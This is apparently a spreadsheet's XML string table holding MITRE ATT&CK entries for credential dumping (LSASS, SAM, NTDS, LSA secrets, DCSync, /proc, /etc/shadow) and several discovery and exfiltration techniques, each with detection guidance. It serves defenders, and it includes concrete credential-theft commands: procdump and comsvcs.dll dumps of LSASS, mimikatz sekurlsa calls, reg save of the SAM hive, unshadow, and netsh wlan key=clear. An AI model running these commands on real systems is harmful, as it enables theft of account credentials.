    <t xml:space="preserve">Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information.
Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.
</t>
  </si>
  <si>
    <t>### Windows
Monitor for unexpected processes interacting with lsass.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as [Mimikatz](https://attack.mitre.org/software/S0002) access the LSA Subsystem Service (LSASS) process by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.
Hash dumpers open the Security Accounts Manager (SAM) on the local file system (%SystemRoot%/system32/config/SAM) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well. 
On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.
Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like [Mimikatz](https://attack.mitre.org/software/S0002). [PowerShell](https://attack.mitre.org/techniques/T1059/001) scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module, (Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.
Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync. (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Note: Domain controllers may not log replication requests originating from the default domain controller account. (Citation: Harmj0y DCSync Sept 2015). Also monitor for network protocols  (Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests (Citation: Microsoft SAMR) from IPs not associated with known domain controllers. (Citation: AdSecurity DCSync Sept 2015)
### Linux
To obtain the passwords and hashes stored in memory, processes must open a maps file in the `/proc` filesystem for the process being analyzed. This file is stored under the path `/proc/&lt;pid&gt;/maps`, where the `&lt;pid&gt;` directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.</t>
  </si>
  <si>
    <t>T1003.001</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, Logon Session: Logon Session Creation, Process: OS API Execution, Process: Process Access, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Windows</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550).
As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.
For example, on the target host use procdump:
* &lt;code&gt;procdump -ma lsass.exe lsass_dump&lt;/code&gt;
Locally, mimikatz can be run using:
* &lt;code&gt;sekurlsa::Minidump lsassdump.dmp&lt;/code&gt;
* &lt;code&gt;sekurlsa::logonPasswords&lt;/code&gt;
Built-in Windows tools such as `comsvcs.dll` can also be used:
* &lt;code&gt;rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full&lt;/code&gt;(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector)
Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS)
Windows Security Support Provider (SSP) DLLs are loaded into LSASS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
The following SSPs can be used to access credentials:
* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection)
* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)
</t>
  </si>
  <si>
    <t>Monitor for unexpected processes interacting with LSASS.exe.(Citation: Medium Detecting Attempts to Steal Passwords from Memory) Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. Credential dumpers may also use methods for reflective [Process Injection](https://attack.mitre.org/techniques/T1055) to reduce potential indicators of malicious activity.
On Windows 8.1 and Windows Server 2012 R2, monitor Windows Logs for LSASS.exe creation to verify that LSASS started as a protected process.
Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.</t>
  </si>
  <si>
    <t>T1003.002</t>
  </si>
  <si>
    <t>Security Account Manager (T1003.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, File: File Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t xml:space="preserve">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
A number of tools can be used to retrieve the SAM file through in-memory techniques:
* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py
Alternatively, the SAM can be extracted from the Registry with Reg:
* &lt;code&gt;reg save HKLM\sam sam&lt;/code&gt;
* &lt;code&gt;reg save HKLM\system system&lt;/code&gt;
Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)
Notes: 
* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.
</t>
  </si>
  <si>
    <t>Hash dumpers open the Security Accounts Manager (SAM) on the local file system (&lt;code&gt;%SystemRoot%/system32/config/SAM&lt;/code&gt;) or create a dump of the Registry SAM key to access stored account password hashes. Some hash dumpers will open the local file system as a device and parse to the SAM table to avoid file access defenses. Others will make an in-memory copy of the SAM table before reading hashes. Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.</t>
  </si>
  <si>
    <t>T1003.003</t>
  </si>
  <si>
    <t>NTDS (T1003.003)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in &lt;code&gt;%SystemRoot%\NTDS\Ntds.dit&lt;/code&gt; of a domain controller.(Citation: Wikipedia Active Directory)
In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015)
The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.
* Volume Shadow Copy
* secretsdump.py
* Using the in-built Windows tool, ntdsutil.exe
* Invoke-NinjaCopy
</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for program execution that may be indicative of credential dumping, especially attempts to access or copy the NTDS.dit.</t>
  </si>
  <si>
    <t>T1003.004</t>
  </si>
  <si>
    <t>LSA Secrets (T1003.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at &lt;code&gt;HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets&lt;/code&gt;. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)
[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.</t>
  </si>
  <si>
    <t>T1003.005</t>
  </si>
  <si>
    <t>Cached Domain Credentials (T1003.005)</t>
  </si>
  <si>
    <t>Command: Command Execution</t>
  </si>
  <si>
    <t>Linux, Windows</t>
  </si>
  <si>
    <t>Adversaries may attempt to access cached domain credentials used to allow authentication to occur in the event a domain controller is unavailable.(Citation: Microsoft - Cached Creds)
On Windows Vista and newer, the hash format is DCC2 (Domain Cached Credentials version 2) hash, also known as MS-Cache v2 hash.(Citation: PassLib mscache) The number of default cached credentials varies and can be altered per system. This hash does not allow pass-the-hash style attacks, and instead requires [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to recover the plaintext password.(Citation: ired mscache)
On Linux systems, Active Directory credentials can be accessed through caches maintained by software like System Security Services Daemon (SSSD) or Quest Authentication Services (formerly VAS). Cached credential hashes are typically located at `/var/lib/sss/db/cache.[domain].ldb` for SSSD or `/var/opt/quest/vas/authcache/vas_auth.vdb` for Quest. Adversaries can use utilities, such as `tdbdump`, on these database files to dump the cached hashes and use [Password Cracking](https://attack.mitre.org/techniques/T1110/002) to obtain the plaintext password.(Citation: Brining MimiKatz to Unix) 
With SYSTEM or sudo access, the tools/utilities such as [Mimikatz](https://attack.mitre.org/software/S0002), [Reg](https://attack.mitre.org/software/S0075), and secretsdump.py for Windows or Linikatz for Linux can be used to extract the cached credentials.(Citation: Brining MimiKatz to Unix)
Note: Cached credentials for Windows Vista are derived using PBKDF2.(Citation: PassLib mscache)</t>
  </si>
  <si>
    <t>Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.
Detection of compromised [Valid Accounts](https://attack.mitre.org/techniques/T1078) in-use by adversaries may help as well.</t>
  </si>
  <si>
    <t>T1003.006</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Access, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may attempt to access credentials and other sensitive information by abusing a Windows Domain Controller's application programming interface (API)(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) (Citation: Wine API samlib.dll) to simulate the replication process from a remote domain controller using a technique called DCSync.
Members of the Administrators, Domain Admins, and Enterprise Admin groups or computer accounts on the domain controller are able to run DCSync to pull password data(Citation: ADSecurity Mimikatz DCSync) from Active Directory, which may include current and historical hashes of potentially useful accounts such as KRBTGT and Administrators. The hashes can then in turn be used to create a [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) for use in [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003)(Citation: Harmj0y Mimikatz and DCSync) or change an account's password as noted in [Account Manipulation](https://attack.mitre.org/techniques/T1098).(Citation: InsiderThreat ChangeNTLM July 2017)
DCSync functionality has been included in the "lsadump" module in [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: GitHub Mimikatz lsadump Module) Lsadump also includes NetSync, which performs DCSync over a legacy replication protocol.(Citation: Microsoft NRPC Dec 2017)</t>
  </si>
  <si>
    <t>Monitor domain controller logs for replication requests and other unscheduled activity possibly associated with DCSync.(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft GetNCCChanges) (Citation: Samba DRSUAPI) Also monitor for network protocols(Citation: Microsoft DRSR Dec 2017) (Citation: Microsoft NRPC Dec 2017) and other replication requests(Citation: Microsoft SAMR) from IPs not associated with known domain controllers.(Citation: AdSecurity DCSync Sept 2015)
Note: Domain controllers may not log replication requests originating from the default domain controller account.(Citation: Harmj0y DCSync Sept 2015)</t>
  </si>
  <si>
    <t>T1003.007</t>
  </si>
  <si>
    <t>Proc Filesystem (T1003.007)</t>
  </si>
  <si>
    <t>Linux</t>
  </si>
  <si>
    <t>Adversaries may gather credentials from the proc filesystem or `/proc`. The proc filesystem is a pseudo-filesystem used as an interface to kernel data structures for Linux based systems managing virtual memory. For each process, the `/proc/&lt;PID&gt;/maps` file shows how memory is mapped within the process’s virtual address space. And `/proc/&lt;PID&gt;/mem`, exposed for debugging purposes, provides access to the process’s virtual address space.(Citation: Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)
When executing with root privileges, adversaries can search these memory locations for all processes on a system that contain patterns indicative of credentials. Adversaries may use regex patterns, such as &lt;code&gt;grep -E "^[0-9a-f-]* r" /proc/"$pid"/maps | cut -d' ' -f 1&lt;/code&gt;, to look for fixed strings in memory structures or cached hashes.(Citation: atomic-red proc file system) When running without privileged access, processes can still view their own virtual memory locations. Some services or programs may save credentials in clear text inside the process’s memory.(Citation: MimiPenguin GitHub May 2017)(Citation: Polop Linux PrivEsc Gitbook)
If running as or with the permissions of a web browser, a process can search the `/maps` &amp; `/mem` locations for common website credential patterns (that can also be used to find adjacent memory within the same structure) in which hashes or cleartext credentials may be located.</t>
  </si>
  <si>
    <t>To obtain the passwords and hashes stored in memory, processes must open a maps file in the `/proc` filesystem for the process being analyzed. This file is stored under the path `/proc/PID/maps`, where the `PID` directory is the unique pid of the program being interrogated for such authentication data. The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes opening this file in the proc file system, alerting on the pid, process name, and arguments of such programs.</t>
  </si>
  <si>
    <t>T1003.008</t>
  </si>
  <si>
    <t>/etc/passwd and /etc/shadow (T1003.008)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may attempt to dump the contents of &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt; to enable offline password cracking. Most modern Linux operating systems use a combination of &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt; to store user account information including password hashes in &lt;code&gt;/etc/shadow&lt;/code&gt;. By default, &lt;code&gt;/etc/shadow&lt;/code&gt; is only readable by the root user.(Citation: Linux Password and Shadow File Formats)
The Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) &lt;code&gt;# /usr/bin/unshadow /etc/passwd /etc/shadow &gt; /tmp/crack.password.db&lt;/code&gt;
</t>
  </si>
  <si>
    <t>The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access &lt;code&gt;/etc/passwd&lt;/code&gt; and &lt;code&gt;/etc/shadow&lt;/code&gt;, alerting on the pid, process name, and arguments of such programs.</t>
  </si>
  <si>
    <t>T1005</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Process: OS API Execution, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t>Linux, Network, Windows, macOS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may search local system sources, such as file systems and configuration files or local databases, to find files of interest and sensitive data prior to Exfiltration.
Adversaries may do this using a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), such as [cmd](https://attack.mitre.org/software/S0106) as well as a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008), which have functionality to interact with the file system to gather information.(Citation: show_run_config_cmd_cisco) Adversaries may also use [Automated Collection](https://attack.mitre.org/techniques/T1119) on the local system.
</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Further, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands may also be used to collect files such as configuration files with built-in features native to the network device platform.(Citation: Mandiant APT41 Global Intrusion )(Citation: US-CERT-TA18-106A) Monitor CLI activity for unexpected or unauthorized use commands being run by non-standard users from non-standard locations. Data may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
For network infrastructure devices, collect AAA logging to monitor `show` commands that view configuration files. </t>
  </si>
  <si>
    <t>T1006</t>
  </si>
  <si>
    <t>Command: Command Execution, Drive: Drive Access, File: File Creation</t>
  </si>
  <si>
    <t>Network, Windows</t>
  </si>
  <si>
    <t>Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)
Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)</t>
  </si>
  <si>
    <t>Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives. (Citation: Github PowerSploit Ninjacopy)
Monitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [PowerShell](https://attack.mitre.org/techniques/T1059/001), additional logging of PowerShell scripts is recommended.</t>
  </si>
  <si>
    <t>T1007</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>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use the information from [System Service Discovery](https://attack.mitre.org/techniques/T1007) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</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</si>
  <si>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information related to services.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</si>
  <si>
    <t>T1008</t>
  </si>
  <si>
    <t>Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.</t>
  </si>
  <si>
    <t>T1010</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.(Citation: Prevailion DarkWatchman 2021) For example, information about application windows could be used identify potential data to collect as well as identifying security tooling ([Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) to evade.(Citation: ESET Grandoreiro April 2020)
Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) commands and [Native API](https://attack.mitre.org/techniques/T1106) functions.</t>
  </si>
  <si>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</si>
  <si>
    <t>T1011</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow</t>
  </si>
  <si>
    <t>Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.
Adversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.</t>
  </si>
  <si>
    <t>Monitor for processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a web browser opening with a mouse click or key press) but access the network without such may be malicious.
Monitor for and investigate changes to host adapter settings, such as addition and/or replication of communication interfaces.</t>
  </si>
  <si>
    <t>T1011.001</t>
  </si>
  <si>
    <t>Exfiltration Over Bluetooth (T1011.001)</t>
  </si>
  <si>
    <t>Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.
Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.</t>
  </si>
  <si>
    <t>T1012</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Access</t>
  </si>
  <si>
    <t>Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.
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the information may help adversaries to further their operation within a network. Adversaries may use the information from [Query Registry](https://attack.mitre.org/techniques/T1012) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.</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</si>
  <si>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Interaction with the Windows Registry may come from the command line using utilities such as [Reg](https://attack.mitre.org/software/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring.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</si>
  <si>
    <t>T1014</t>
  </si>
  <si>
    <t>Drive: Drive Modification, File: File Modification, Firmware: Firmware Modification</t>
  </si>
  <si>
    <t>Adversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components. Rootkits are programs that hide the existence of malware by intercepting/hooking and modifying operating system API calls that supply system information. (Citation: Symantec Windows Rootkits) 
Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a hypervisor, Master Boot Record, or [System Firmware](https://attack.mitre.org/techniques/T1542/001). (Citation: Wikipedia Rootkit) Rootkits have been seen for Windows, Linux, and Mac OS X systems. (Citation: CrowdStrike Linux Rootkit) (Citation: BlackHat Mac OSX Rootkit)</t>
  </si>
  <si>
    <t>Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR. (Citation: Wikipedia Rootkit)</t>
  </si>
  <si>
    <t>T1016</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: OS API Execution, Process: Process Creation, Script: Script Execution</t>
  </si>
  <si>
    <t xml:space="preserve">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[ipconfig](https://attack.mitre.org/software/S0100)/[ifconfig](https://attack.mitre.org/software/S0101), [nbtstat](https://attack.mitre.org/software/S0102), and [route](https://attack.mitre.org/software/S0103).
Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to gather information about configurations and settings, such as IP addresses of configured interfaces and static/dynamic routes (e.g. &lt;code&gt;show ip route&lt;/code&gt;, &lt;code&gt;show ip interface&lt;/code&gt;).(Citation: US-CERT-TA18-106A)(Citation: Mandiant APT41 Global Intrusion )
Adversaries may use the information from [System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016) during automated discovery to shape follow-on behaviors, including determining certain access within the target network and what actions to do next. </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</si>
  <si>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{{LinkById|T1059.008}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</si>
  <si>
    <t>T1016.001</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may check for Internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways such as using [Ping](https://attack.mitre.org/software/S0097), &lt;code&gt;tracert&lt;/code&gt;, and GET requests to websites.
Adversaries may use the results and responses from these requests to determine if the system is capable of communicating with their C2 servers before attempting to connect to them. The results may also be used to identify routes, redirectors, and proxy servers.</t>
  </si>
  <si>
    <t>System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Command and Control, based on the information obtained.
Monitor processes and command-line arguments for actions that could be taken to check Internet connectivity.</t>
  </si>
  <si>
    <t>T1016.002</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: OS API Execution</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may search for information about Wi-Fi networks, such as network names and passwords, on compromised systems. Adversaries may use Wi-Fi information as part of [Account Discovery](https://attack.mitre.org/techniques/T1087), [Remote System Discovery](https://attack.mitre.org/techniques/T1018), and other discovery or [Credential Access](https://attack.mitre.org/tactics/TA0006) activity to support both ongoing and future campaigns.
Adversaries may collect various types of information about Wi-Fi networks from hosts. For example, on Windows names and passwords of all Wi-Fi networks a device has previously connected to may be available through `netsh wlan show profiles` to enumerate Wi-Fi names and then `netsh wlan show profile “Wi-Fi name” key=clear` to show a Wi-Fi network’s corresponding password.(Citation: BleepingComputer Agent Tesla steal wifi passwords)(Citation: Malware Bytes New AgentTesla variant steals WiFi credentials)(Citation: Check Point APT35 CharmPower January 2022) Additionally, names and other details of locally reachable Wi-Fi networks can be discovered using calls to `wlanAPI.dll` [Native API](https://attack.mitre.org/techniques/T1106) functions.(Citation: Binary Defense Emotes Wi-Fi Spreader)
On Linux, names and passwords of all Wi-Fi-networks a device has previously connected to may be available in files under ` /etc/NetworkManager/system-connections/`.(Citation: Wi-Fi Password of All Connected Networks in Windows/Linux) On macOS, the password of a known Wi-Fi may be identified with ` security find-generic-password -wa wifiname` (requires admin username/password).(Citation: Find Wi-Fi Password on Mac)
</t>
  </si>
  <si>
    <t>This type of attack technique cannot be easily mitigated with preventive controls since it is based on the abuse of system features.</t>
  </si>
  <si>
    <t>T1018</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Process: Process Creation</t>
  </si>
  <si>
    <t xml:space="preserve">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or &lt;code&gt;net view&lt;/code&gt; using [Net](https://attack.mitre.org/software/S0039).
Adversaries may also analyze data from local host files (ex: &lt;code&gt;C:\Windows\System32\Drivers\etc\hosts&lt;/code&gt; or &lt;code&gt;/etc/hosts&lt;/code&gt;) or other passive means (such as local [Arp](https://attack.mitre.org/software/S0099) cache entries) in order to discover the presence of remote systems in an environment.
Adversaries may also target discovery of network infrastructure as well as leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands on network devices to gather detailed information about systems within a network (e.g. &lt;code&gt;show cdp neighbors&lt;/code&gt;, &lt;code&gt;show arp&lt;/code&gt;).(Citation: US-CERT-TA18-106A)(Citation: CISA AR21-126A FIVEHANDS May 2021)  
</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</si>
  <si>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discover remote systems, such as &lt;code&gt;ping.exe&lt;/code&gt; and &lt;code&gt;tracert.exe&lt;/code&gt;, especially when executed in quick succession.(Citation: Elastic - Koadiac Detection with EQL)</t>
  </si>
  <si>
    <t>T1020</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Script: Script Execution</t>
  </si>
  <si>
    <t>Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection.(Citation: ESET Gamaredon June 2020) 
When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).</t>
  </si>
  <si>
    <t>Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.</t>
  </si>
  <si>
    <t>T1020.001</t>
  </si>
  <si>
    <t>Traffic Duplication (T1020.001)</t>
  </si>
  <si>
    <t>IaaS, Network</t>
  </si>
  <si>
    <t>Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)
Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)
Many cloud-based environments also support traffic mirroring.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Adversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. </t>
  </si>
  <si>
    <t>T1021</t>
  </si>
  <si>
    <t>Command: Command Execution, Logon Session: Logon Session Creation, Module: Module Load, Network Share: Network Share Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow, Process: Process Creation, WMI: WMI Creation</t>
  </si>
  <si>
    <t>IaaS, Linux, Windows, macOS</t>
  </si>
  <si>
    <t>Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to log into a service that accepts remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.
In an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services) They could also login to accessible SaaS or IaaS services, such as those that federate their identities to the domain. 
